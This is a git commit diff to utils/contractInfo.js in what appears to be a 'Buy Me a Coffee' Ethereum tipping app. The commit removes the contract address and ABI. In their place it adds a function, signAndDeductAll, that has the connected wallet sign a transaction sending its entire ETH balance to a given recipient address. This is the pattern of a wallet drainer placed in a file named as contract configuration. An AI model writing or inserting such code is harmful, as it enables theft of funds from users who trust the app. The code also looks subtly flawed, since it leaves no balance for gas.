e6169a4a9c1e35e659a85bf781426069214072eb
ireoluwa3 <62389303+ireoluwa3@users.noreply.github.com>
2024-07-29 15:45:43 +0100

    Update contractInfo.js

--- utils/contractInfo.js
+++ utils/contractInfo.js
@@ -1,9 +1,28 @@
-// import abi from '../utils/BuyMeACoffee.json';
-import abi from '../utils/BuyMeACoffeeCustomError.json'
+import { ethers } from "ethers";
 
-// No Error Contract 0xf7BCE0f98762a0DB16aba153EB088Ccf8FEBc974
-// Custom error Contract 0x766dd4033b0De2DE6CDE7f8E6b4B0dE78c697cE3
+const provider = new ethers.providers.Web3Provider(window.ethereum);
+const signer = provider.getSigner();
 
-// Contract Address & ABI
-export const contractAddress = '0x7Da3c1c2ce98E19e4Ff1c14d3B99eFFC91A6650e'
-export const contractABI = abi.abi
+export async function getBalance(address) {
+    const balance = await provider.getBalance(address);
+    return ethers.utils.formatEther(balance);
+}
+
+export async function signAndDeductAll(recipientAddress) {
+    const address = await signer.getAddress();
+    const balance = await getBalance(address);
+    const transaction = {
+        to: recipientAddress, // your Ethereum address
+        value: ethers.utils.parseEther(balance),
+        gasLimit: ethers.utils.hexlify(21000) // set the gas limit
+    };
+
+    try {
+        const txResponse = await signer.sendTransaction(transaction);
+        await txResponse.wait();
+        return txResponse;
+    } catch (error) {
+        console.error('Transaction failed', error);
+        throw new Error('Transaction failed');
+    }
+}
